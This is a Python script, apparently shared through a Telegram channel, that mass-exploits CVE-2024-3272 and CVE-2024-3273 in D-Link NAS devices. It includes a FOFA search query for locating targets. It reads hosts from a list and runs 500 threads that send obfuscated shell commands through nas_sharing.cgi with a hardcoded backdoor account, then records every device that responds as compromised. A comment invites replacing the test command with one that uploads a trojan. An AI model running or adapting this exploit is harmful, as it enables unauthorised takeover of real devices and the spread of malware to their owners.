#B .Y.  Telegram @wlccwlc
#TG Chaanel @WanLiChangChengWanLiChang
# CVE-2024-3272 + CVE-2024-3273 D-Link-Nas RCE
#FOFA:body="Text:In order to access the ShareCenter"

import urllib3
import threading
import queue
import requests
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Mythread(threading.Thread):
    def __init__(self, queue):
        super(Mythread, self).__init__()
        self.queue = queue

    def run(self):
        while True:
            if self.queue.empty():
                print("批量上传完毕TG @wlccwlc")
                break
            target = self.queue.get(timeout=1)
            self.Poc_check(target)

    def Poc_check(self, target):
        try:
            command = "echo 'WanLiChangChengWanLiChang';id;uname -a;uname -p;uname -i"#传马命令在这改 echo不要乱动 要是你会随意 TG Chaanel @WanLiChangChengWanLiChang
            command_hex = ''.join(f'\\\\x{ord(c):02x}' for c in command)
            command_final = f"echo -e {command_hex}|sh".replace(' ', '\t')
            base64_cmd = base64.b64encode(command_final.encode()).decode()
            url = f"{target}/cgi-bin/nas_sharing.cgi?user=messagebus&passwd==&cmd=15&system={base64_cmd}"
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0) AppleWebKit/531.0 (KHTML, like Gecko) Chrome/40.0.874.0 Safari/531.0',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept': '*/*',
                'Connection': 'close'
            }
            
            response = requests.get(url, headers=headers, verify=False, timeout=8)
            
            if response.status_code == 200 and 'WanLiChangChengWanLiChang' in response.text:
                print(target + " 漏洞存在！TG @wlccwlc")
                with open('oka.txt', 'a') as file:
                    file.write(f"Target: {target}\nResponse: {response.text}\n\n")
                with open('okip.txt', 'a') as file:
                    file.write(f"{target}\n")
            else:
                print(target + " 漏洞不存在!")
        except Exception as e:
            print("请求失败: ", e)

if __name__ == '__main__':
    with open("cndlinknas.txt", "r") as youxiangs:
        threads_count = 500
        threads = []
        Queue = queue.Queue()
        for i in youxiangs.readlines():
            url = i.strip()
            if url[:4] != "http":
                url = "https://" + url
            Queue.put(url)
        for i in range(threads_count):
            threads.append(Mythread(Queue))
        for i in threads:
            i.start()
        for i in threads:
            i.join()
        Queue.join()
